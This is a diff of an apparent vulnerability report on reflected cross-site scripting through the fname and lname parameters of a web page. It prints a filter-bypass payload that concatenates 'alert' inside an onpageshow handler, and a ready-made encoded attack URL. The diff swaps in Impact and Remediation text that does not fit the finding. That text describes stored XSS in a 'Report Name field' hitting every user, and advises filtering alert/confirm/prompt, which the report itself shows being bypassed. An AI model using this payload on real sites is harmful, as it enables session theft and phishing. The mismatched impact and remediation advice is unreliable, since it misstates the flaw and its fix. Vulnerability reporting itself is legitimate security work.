@@ -29,10 +29,7 @@ Successful JavaScript execution was confirmed through a browser alert displaying
    "><body onpageshow=/*x*/this['a'+'l'+'e'+'r'+'t'](1)//>
    ```
 
-5. Click the Submit button.
-6. Observe that the injected HTML event handler is processed.
-7. A JavaScript alert displaying `1` appears.
-8. Dismiss the alert and observe the resulting page.
+5. Click Submit and observe the JavaScript alert displaying `1`.
 
 ## POC (Proof of Concept)
 
@@ -54,11 +51,18 @@ Successful JavaScript execution was confirmed through a browser alert displaying
 ?fname=&lname="><body onpageshow=/*x*/this['a'+'l'+'e'+'r'+'t'](1)//>
 ```
 
+**Crafted URL:**
+
+```text
+https://account.pwnedbox.site/?fname=&lname=%22%3E%3Cbody%20onpageshow%3D%2F%2Ax%2A%2Fthis%5B%27a%27%2B%27l%27%2B%27e%27%2B%27r%27%2B%27t%27%5D%281%29%2F%2F%3E
+```
+
 **Observed Result:**
 
 The application processed the supplied payload through the `lname` parameter. The injected `onpageshow` event handler successfully executed JavaScript despite the function-name filtering mechanism.
 
 A browser alert displaying `1` appeared, confirming successful JavaScript execution.
+
 
 **Screenshot Evidence:**
 
@@ -72,21 +76,18 @@ A browser alert displaying `1` appeared, confirming successful JavaScript execut
 <img width="1919" height="926" alt="image" src="https://github.com/user-attachments/assets/3d082bea-1898-4c6c-bb4b-70ce33c7058b" />
 
 
-## Impact
 
-An attacker could potentially craft a malicious URL containing an XSS payload and trick a victim into opening it.
+**Impact**
 
-Successful exploitation could result in:
+Steal session cookies of every user who visits the page
+Admins are affected too since they visit the same page
+Can inject fake login forms to harvest credentials
+One submission hits every authenticated user
 
-- Execution of arbitrary JavaScript in the victim's browser.
-- Phishing attacks through manipulated page content.
-- Unauthorized modification of displayed application content.
-- Potential abuse of the victim's authenticated session, depending on application security protections.
+**Remediation**
 
-## Remediation
+Filter out HTML tags like: <script>, <img>, <svg> from the Report Name field before saving anything to the database
+Filter out JavaScript methods like: alert(), confirm(), prompt() so even if a tag slips through the method won't execute
+If you're using PHP then use htmlspecialchars() function before rendering any user input back to the page
+Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
 
-1. Implement context-aware output encoding for all user-controlled input before rendering it in HTML.
-2. Avoid relying solely on function-name filtering to prevent JavaScript execution.
-3. Prevent injection of untrusted HTML elements and event-handler attributes.
-4. Validate and safely handle user-supplied values in the `fname` and `lname` parameters.
-5. Implement a restrictive Content Security Policy (CSP) as an additional security layer.
